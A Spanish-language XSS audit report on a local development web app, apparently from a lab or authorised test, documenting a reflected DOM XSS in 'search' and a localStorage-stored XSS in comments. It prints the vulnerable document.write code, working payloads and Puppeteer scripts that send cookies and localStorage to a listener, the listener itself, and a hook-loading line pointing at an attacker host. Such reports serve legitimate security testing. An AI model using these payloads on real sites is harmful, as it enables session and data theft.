# Informe de auditoría XSS

- Objetivo: `http://web.dev.local:8082`
- Fecha de análisis: `2026-04-21T06:01:12`
- Estado: vulnerabilidades XSS confirmadas y explotadas

## Resumen ejecutivo

Se identificaron dos vulnerabilidades XSS en la aplicación:

1. XSS basado en DOM/reflejado en el parámetro `search`.
2. XSS persistente basado en cliente mediante `name` / `comment`, almacenado en `localStorage` y renderizado después con `document.write()`.

La explotación activa fue demostrada con exfiltración controlada hacia un listener local del auditor (`127.0.0.1:9011`), confirmando ejecución arbitraria de JavaScript en navegador víctima.

## Hallazgo 1: XSS DOM reflejado en `search`

- URL vulnerable: `http://web.dev.local:8082/?search=...`
- Tipo: `DOM XSS / Reflected`
- Sink vulnerable:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('search');
document.write('<p>Resultados para: <strong>' + searchTerm + '</strong></p>');
```

El parámetro `search` se lee desde la URL y se inserta directamente en HTML usando `document.write()` sin ningún tipo de escape o sanitización.

### Payload de confirmación

```html
</strong><img src=x onerror="new Image().src='http://127.0.0.1:9011/reflect?c='+encodeURIComponent(document.cookie)+'&ls='+encodeURIComponent(localStorage.getItem('comments')||'')+'&o='+encodeURIComponent(location.origin)"><strong>
```

### Comando utilizado

```bash
cd /app/reports && node - <<'JS'
const puppeteer = require('puppeteer');
(async()=>{
  const browser = await puppeteer.launch({headless:'new', args:['--no-sandbox']});
  const page = await browser.newPage();
  const reflectedPayload = `</strong><img src=x onerror="new Image().src='http://127.0.0.1:9011/reflect?c='+encodeURIComponent(document.cookie)+'&ls='+encodeURIComponent(localStorage.getItem('comments')||'')+'&o='+encodeURIComponent(location.origin)"><strong>`;
  await page.goto('http://web.dev.local:8082/?search=' + encodeURIComponent(reflectedPayload), {waitUntil:'load', timeout:15000});
  await new Promise(r=>setTimeout(r,2000));
  await browser.close();
})();
JS
```

### Evidencia

El listener del auditor recibió:

```text
GET /reflect?c=&ls=&o=http%3A%2F%2Fweb.dev.local%3A8082
```

Esto demuestra ejecución de JavaScript arbitrario desde el parámetro `search`.

## Hallazgo 2: XSS persistente en comentarios (`name`, `comment`)

- URL de carga: `http://web.dev.local:8082/?name=...&comment=...`
- Tipo: `Stored XSS (client-side persisted in localStorage)`
- Flujo vulnerable:

```javascript
const name = urlParams.get('name');
const comment = urlParams.get('comment');

if (name && comment) {
    let comments = JSON.parse(localStorage.getItem('comments') || '[]');
    comments.push({ name: name, comment: comment, date: new Date().toLocaleString() });
    localStorage.setItem('comments', JSON.stringify(comments));
    window.location.href = window.location.pathname;
}

comments.forEach(function(c) {
    document.write('<div class="comment-author">' + c.name + '</div>');
    document.write('<div>' + c.comment + '</div>');
});
```

El comentario se guarda sin saneado en `localStorage` y luego se renderiza con `document.write()`, provocando ejecución automática en visitas posteriores.

### Payload final de explotación

```html
<img src=x onerror="new Image().src='http://127.0.0.1:9011/stored?ls='+encodeURIComponent(localStorage.getItem('comments')||'')+'&u='+encodeURIComponent(location.href)">
```

### Comando utilizado

```bash
cd /app/reports && node - <<'JS'
const puppeteer = require('puppeteer');
(async()=>{
  const browser = await puppeteer.launch({headless:'new', args:['--no-sandbox']});
  const page = await browser.newPage();
  await page.goto('http://web.dev.local:8082/', {waitUntil:'load', timeout:15000});
  await page.evaluate(() => localStorage.clear());
  const storedPayload = `<img src=x onerror="new Image().src='http://127.0.0.1:9011/stored?ls='+encodeURIComponent(localStorage.getItem('comments')||'')+'&u='+encodeURIComponent(location.href)">`;
  await page.goto('http://web.dev.local:8082/?name=' + encodeURIComponent('auditor') + '&comment=' + encodeURIComponent(storedPayload), {waitUntil:'load', timeout:15000});
  await new Promise(r=>setTimeout(r,1500));
  await page.goto('http://web.dev.local:8082/', {waitUntil:'load', timeout:15000});
  await new Promise(r=>setTimeout(r,2000));
  await browser.close();
})();
JS
```

### Evidencia

El listener local recibió peticiones de exfiltración desde el comentario persistido:

```text
GET /stored?ls=%5B%7B%22name%22%3A%22auditor%22%2C%22comment%22%3A%22%3Cimg%20src%3Dx%20onerror%3D%5C%22new%20Image().src%3D%27http%3A%2F%2F127.0.0.1%3A9011%2Fstored%3Fls%3D%27%2BencodeURIComponent(localStorage.getItem(%27comments%27)%7C%7C%27%27)%2B%27%26u%3D%27%2BencodeURIComponent(location.href)%5C%22%3E%22%2C%22date%22%3A%224%2F21%2F2026%2C%206%3A03%3A59%20AM%22%7D%5D&u=http%3A%2F%2Fweb.dev.local%3A8082%2F
```

Esta evidencia confirma:

- Persistencia del payload.
- Ejecución automática al visualizar comentarios.
- Capacidad de robo de datos accesibles en navegador, incluyendo `localStorage`.

## Herramientas y comandos auxiliares utilizados

### Inspección HTTP básica

```bash
python - <<'PY'
import requests
r=requests.get('http://web.dev.local:8082',timeout=10)
print(r.status_code)
print(r.headers)
PY
```

### Extracción de formularios y scripts

```bash
python - <<'PY'
import requests
from bs4 import BeautifulSoup
html=requests.get('http://web.dev.local:8082',timeout=10).text
s=BeautifulSoup(html,'html.parser')
for f in s.find_all('form'):
    print(f.get('method'), f.get('action'))
PY
```

### Listener local para captura de exfiltración

```bash
python - <<'PY'
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print('GET', self.path, flush=True)
        self.send_response(204)
        self.end_headers()
    def log_message(self, *args):
        pass
HTTPServer(('127.0.0.1', 9011), H).serve_forever()
PY
```

## Impacto real

El impacto es crítico en el contexto del navegador de la víctima:

- Robo de datos de sesión disponibles en `document.cookie`.
- Exfiltración de información persistida en `localStorage` / `sessionStorage`.
- Posibilidad de inyectar hooks externos de post-explotación, por ejemplo:

```html
<script src="http://atacante.local:3000/hook.js"></script>
```

- Ejecución de acciones no autorizadas en nombre del usuario autenticado si la aplicación reutiliza cookies o tokens.
- Persistencia del compromiso en el caso del sistema de comentarios.

## Conclusión

El objetivo es vulnerable a XSS explotable de forma práctica. La vulnerabilidad en `search` permite ejecución reflejada/DOM inmediata, y la funcionalidad de comentarios permite persistencia en `localStorage` con ejecución automática posterior. Se demostró explotación activa mediante exfiltración controlada a infraestructura del auditor.
